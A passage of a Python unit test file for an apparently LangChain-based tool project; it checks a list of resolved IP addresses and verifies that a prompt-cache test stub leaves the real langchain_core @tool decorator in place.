        assert ips == ['93.184.216.34', '8.8.8.8', '8.8.4.4', '1.1.1.1']


class TestModuleStubIsolation:
    def test_prompt_cache_stub_leaves_the_real_tool_decorator_installed(self):
        """The prompt-cache harness stubs langchain_core.tools at import time. When the real
        module is already loaded (as it is here, via web_tools), that stub must not replace the
        real @tool decorator, or every tool module imported afterwards exposes raw functions."""
        import importlib

        import langchain_core.tools as real_tools

        real_decorator = real_tools.tool
        importlib.import_module('tests.unit.test_prompt_cache_integration')

        assert real_tools.tool is real_decorator

        @real_tools.tool
        def _probe_tool(value: str) -> str:
            """Probe."""
            return value

        assert hasattr(_probe_tool, 'ainvoke')
